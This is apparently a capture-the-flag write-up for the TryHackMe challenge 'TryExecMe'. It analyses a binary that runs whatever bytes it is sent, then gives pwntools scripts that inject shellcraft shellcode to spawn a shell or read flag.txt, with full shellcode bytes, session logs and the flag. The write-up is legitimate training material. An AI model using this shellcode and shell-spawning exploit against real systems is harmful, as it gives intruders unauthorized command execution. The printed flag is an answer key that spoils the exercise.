# TryExecMe

## Source Code Analysis

- Source Code
    
    ```cpp
    int main(){
        setup();
        banner();
        char *buf[128];   
    
        puts("\nGive me your shell, and I will execute it: ");
        read(0,buf,sizeof(buf));
        puts("\nExecuting Spell...\n");
    
        ( ( void (*) () ) buf) ();
    
    }
    ```
    

We can see there is a `( ( void (*) () ) buf) ();` line, it does the following:

- `( void (*) () )`: Signifies a pointer and points behind (`buf`)
- `();`: Calls the buf

So we can inject arbitrary code (bytes) inside `buf`, and execute it. 

## ELF Analysis

We can first conduct some basic file checks

```bash
└─$ file tryexecme 
tryexecme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a6be832d9e5de3a53a2e305186c4e607617d7d1b, not stripped

└─$ checksec --file tryexecme 
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

```

Notice that NX (No execute) is disable, which allows us to inject code and run it.

## Exploitation

### Pwntools

This time, we need to use the powerful shellcraft

- Pwntool Exploit script
    
    ```python
    from pwn import *
    
    def start(argv=[], *a, **kwargs):
        if args.GDB:
           return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kwargs)
        elif args.REMOTE:
           return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
        else:
            return process([exe] + argv, *a, **kwargs)
    
    gdbscript='''
    b *main
    continue
    '''
    
    exe='./tryexecme'
    elf=context.binary=ELF(exe, checksec=True)
    context.log_level='debug'
    
    io = start()
    
    # Generate from shellcraft
    choice = input('\"Flag\" or \"Shell\"? ')
    
    if choice=='Flag':
        shellcode=asm(shellcraft.cat('flag.txt'))
        shellcode+=asm(shellcraft.exit())
    
    elif choice=='Shell':
       shellcode=asm(shellcraft.sh())
    
    io.sendafter(b'Give me your shell, and I will execute it:', shellcode)
    
    io.interactive()
    ```
    

Here, because I want to explore the power lies in shellcraft, I tried to read the flag and establish a full shell :

- To read the flag, we can just use `shellcraft.cat(<file>)` to include the file (`flag.txt` in this case) we want to read
- To establish a shell, we can use `shellcraft.sh()` to open a new shell

The above commands will return as assembly language, so we need `asm()` to translate them to bytes

- Result (Shell)
    
    ```bash
    └─$ python exploit.py REMOTE <Machine IP> <Port>
        Arch:       amd64-64-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX unknown - GNU_STACK missing
        PIE:        No PIE (0x400000)
        Stack:      Executable
        RWX:        Has RWX segments
        Stripped:   No
    [+] Opening connection to <Machine IP> on port <Port>: Done
    "Flag" or "Shell"? Shell
    ...
    [DEBUG] Sent 0x30 bytes:
        00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
        00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
        00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
        00000030
    [*] Switching to interactive mode
     
    [DEBUG] Received 0x15 bytes:
        b'\n'
        b'Executing Spell...\n'
        b'\n'
    
    Executing Spell...
    
    $ ls
    [DEBUG] Sent 0x3 bytes:
        b'ls\n'
    [DEBUG] Received 0xd bytes:
        b'flag.txt\n'
        b'run\n'
    flag.txt
    run
    $ cat flag.txt
    [DEBUG] Sent 0xd bytes:
        b'cat flag.txt\n'
    [DEBUG] Received 0x28 bytes:
        b'THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}\n'
    THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}
    ```
    

### Raw Payload

Alternatively, you can generate the payload in the CLI, which we need to specify the payload. In the file check, we already know our architecture is `amd64-64-little`, so the correct payload is `amd64.linux.sh`

With that, we can generate our payload and save as shellcraft

```php
└─$ shellcraft amd64.linux.sh > shellcraft

└─$ cat shellcraft                                                                                                                                                                                        
jhH�/bin///sPH��hri�4$1�V^H�VH��1�j;X

```

We can then run a simple script and send the payload

- Raw Payload Script
    
    ```bash
    from pwn import *
    
    def start(argv=[], *a, **kwargs):
        if args.GDB:
           return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kwargs)
        elif args.REMOTE:
           return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
        else:
            return process([exe] + argv, *a, **kwargs)
    
    gdbscript='''
    b *main
    continue
    '''
    
    exe='./tryexecme'
    elf=context.binary=ELF(exe, checksec=True)
    context.log_level='debug'
    
    io = start()
    
    with open('shellcraft','rb') as file:
        shellcode=file.read()
    
    io.sendafter(b'Give me your shell, and I will execute it:', shellcode)
    
    io.interactive()
    
    ```
    
- Result
    
    ```bash
    ─$ python shellcraft.py REMOTE <Machine IP> <Port>
        Arch:       amd64-64-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX unknown - GNU_STACK missing
        PIE:        No PIE (0x400000)
        Stack:      Executable
        RWX:        Has RWX segments
        Stripped:   No
    [+] Opening connection to <Machine IP> on port <Port>: Done
    ...
    [DEBUG] Sent 0x30 bytes:
        00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
        00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
        00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
        00000030
    [*] Switching to interactive mode
     
    [DEBUG] Received 0x15 bytes:
        b'\n'
        b'Executing Spell...\n'
        b'\n'
    
    Executing Spell...
    
    $ ls
    [DEBUG] Sent 0x3 bytes:
        b'ls\n'
    [DEBUG] Received 0xd bytes:
        b'flag.txt\n'
        b'run\n'
    flag.txt
    run
    $ cat flag.txt
    [DEBUG] Sent 0xd bytes:
        b'cat flag.txt\n'
    [DEBUG] Received 0x28 bytes:
        b'THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}\n'
    THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}
    ```
    

Flag: `THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}`